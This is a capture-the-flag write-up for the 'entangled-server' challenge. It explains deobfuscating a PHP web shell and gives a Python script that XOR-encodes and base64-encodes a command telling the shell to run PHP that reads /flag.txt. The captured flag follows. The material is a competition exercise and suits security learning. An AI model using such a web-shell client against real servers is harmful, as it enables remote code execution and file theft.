## Challenge

entangled-server

A NICC agent found an old abandoned server with some very suspicious files on it. We have found the file it was hosting on a webserver but it seems like it was very heavily obfuscated. Can you figure out how to get in?

The flag is located at /flag.txt on the server.

http://entangled-server.niccgetsspooky.xyz:1337

## Solution

When we downloaded the index.php file we noticed it was onfuscated.

Tried to simplify it.

First, we decoded the array and made character list.

Second step was to replace these decoded characters in the script.

We fixed the code a little more to understand it better and then we made a script which gave the flag.

```python
import requests
import base64
import json

def xor_encrypt(data, key):
    result = []
    for i in range(len(data)):
        result.append(chr(ord(data[i]) ^ ord(key[i % len(key)])))
    return ''.join(result)

url = "http://entangled-server.niccgetsspooky.xyz:1337"
key = "5p1n-th3-51lly-5tr1ng5"

payload = {
    "ak": key,
    "a": "e",
    "d": "echo file_get_contents('/flag.txt');"
}

json_payload = json.dumps(payload)
encrypted_payload = xor_encrypt(xor_encrypt(json_payload, key), "ak")

encoded_payload = base64.b64encode(encrypted_payload.encode()).decode()

response = requests.post(url, data={"ak": encoded_payload})

print(response.text)
```


Flag: `NICC{TH3_5P1D3R5_G0T_1N_00P5}`